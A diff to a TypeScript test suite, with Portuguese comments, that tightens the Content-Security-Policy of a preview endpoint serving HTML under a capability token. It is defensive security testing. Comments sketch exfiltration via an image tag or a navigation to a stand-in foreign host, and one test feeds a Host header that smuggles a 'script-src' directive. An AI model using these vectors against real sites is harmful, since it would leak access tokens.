@@ -129,10 +129,37 @@ describe('leitura pelo preview (GET)', () => {
     expect(csp, 'allow-same-origin devolveria a sessão do app ao HTML').not.toContain('allow-same-origin')
   })
 
-  /** Sem fetch/XHR, um HTML hostil não consegue LER o projeto pelo próprio token. */
-  it('rede programática bloqueada na página', async () => {
-    const res = await app.inject({ method: 'GET', url: await urlDe() })
-    expect(res.headers['content-security-policy']).toContain("connect-src 'none'")
+  /**
+   * O token vive na URL — e a URL é legível por qualquer script da própria
+   * página (`location.href`). Então não basta bloquear `fetch`: uma tag
+   * `<img src="https://alheio/?t=…">` levaria a capacidade embora, calada, e
+   * quem a recebesse teria leitura do projeto até ela expirar.
+   *
+   * Por isso TODO subrecurso fica preso à origem que serviu a página. O custo é
+   * consciente: uma página que puxa Tailwind/fontes de CDN aparece sem eles.
+   * Entre renderizar bonito e não vazar uma chave de leitura, é o segundo.
+   */
+  it('subrecurso só da própria origem — nada sai para host alheio', async () => {
+    const res = await app.inject({
+      method: 'GET', url: await urlDe(), headers: { host: 'claudinei.local:9105' },
+    })
+    const csp = res.headers['content-security-policy'] as string
+    for (const d of ['default-src', 'img-src', 'script-src', 'style-src', 'font-src', 'media-src']) {
+      expect(csp, `${d} sem trava de origem`).toMatch(new RegExp(`${d}[^;]*claudinei\\.local:9105`))
+    }
+    expect(csp).toContain("connect-src 'none'")
+    // <base href="https://alheio/"> reapontaria todo caminho relativo para fora.
+    expect(csp).toContain("base-uri 'none'")
+  })
+
+  /** O Host vem do cliente: um `;` nele reescreveria a política inteira. */
+  it('Host esquisito não injeta diretiva — fecha em vez de confiar', async () => {
+    const res = await app.inject({
+      method: 'GET', url: await urlDe(), headers: { host: "x; script-src 'unsafe-inline' *" },
+    })
+    const csp = res.headers['content-security-policy'] as string
+    expect(csp).toContain("default-src 'none'")
+    expect(csp).not.toContain('script-src *')
   })
 
   /** O app inteiro responde `X-Frame-Options: DENY` — se valesse aqui, o iframe
@@ -161,6 +188,19 @@ describe('limites do token de capacidade', () => {
   it('diretório não é servido', async () => {
     const url = (await urlDe()).replace(/\/index\.html$/, '')
     expect((await app.inject({ method: 'GET', url })).statusCode).toBe(404)
+  })
+
+  /**
+   * O que a CSP não alcança: nenhuma diretiva impede a própria página de se
+   * NAVEGAR para fora (`location = 'https://alheio/?t=' + location.href`) — a
+   * antiga `navigate-to` foi abandonada pelos navegadores. É ruidoso (o quadro
+   * sai do ar), mas levaria o token. Prendendo a concessão a quem a pediu, o
+   * token vazado não serve para mais ninguém.
+   */
+  it('token não vale de outro endereço', async () => {
+    const url = await urlDe()
+    expect((await app.inject({ method: 'GET', url, remoteAddress: '127.0.0.1' })).statusCode).toBe(200)
+    expect((await app.inject({ method: 'GET', url, remoteAddress: '10.9.9.9' })).statusCode).toBe(404)
   })
 
   it('expira: passado o prazo, a URL morre', () => {
